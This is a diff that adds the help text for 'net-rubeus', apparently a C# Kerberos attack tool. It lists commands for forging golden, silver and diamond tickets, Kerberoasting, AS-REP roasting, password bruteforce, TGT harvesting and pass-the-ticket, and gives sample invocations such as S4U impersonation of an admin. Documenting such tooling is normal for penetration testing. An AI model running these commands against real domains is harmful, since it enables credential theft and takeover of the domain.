@@ -1,0 +1,42 @@
+ABOUT
+    C# tool for raw Kerberos interaction and abuse. Supports ticket requests, renewals,
+    S4U constrained delegation, golden/silver/diamond tickets, Kerberoasting, AS-REP roasting,
+    password spraying, and ticket management.
+
+USAGE:
+    net-rubeus --- <command> [options]
+
+COMMANDS:
+    asktgt          Request a TGT (password, hash, or certificate)
+    asktgs          Request service ticket(s) from a TGT
+    renew           Renew a TGT
+    brute           Kerberos password bruteforce
+    preauthscan     Scan for accounts without pre-authentication
+    s4u             S4U constrained delegation abuse
+    golden          Forge golden ticket (LDAP or explicit values)
+    silver          Forge silver ticket
+    diamond         Forge diamond TGT
+    ptt             Pass-the-ticket (submit ticket to logon session)
+    purge           Purge tickets from logon session
+    describe        Parse and describe a ticket
+    triage          Triage current tickets (elevated: all users)
+    klist           List tickets in detail
+    monitor         Monitor for new TGTs
+    harvest         Harvest TGTs from logon sessions
+    kerberoast      Perform Kerberoasting
+    asreproast      Perform AS-REP roasting
+    changepw        Change user password via Kerberos
+    hash            Calculate Kerberos password hashes
+    createnetonly   Create hidden desktop/logon session
+    currentluid     Display current logon ID
+
+EXAMPLES:
+    net-rubeus --- asktgt /user:admin /password:P@ssw0rd /ptt
+    net-rubeus --- kerberoast /outfile:hashes.txt
+    net-rubeus --- s4u /user:svc /rc4:HASH /impersonateuser:admin /msdsspn:cifs/dc01 /ptt
+    net-rubeus --- ptt /ticket:ticket.kirbi
+    net-rubeus --- klist
+    net-rubeus --- triage
+
+NOTES:
+    Run net-rubeus --- for full command reference. Many commands support /domain, /dc, /luid, /nowrap, /opsec.
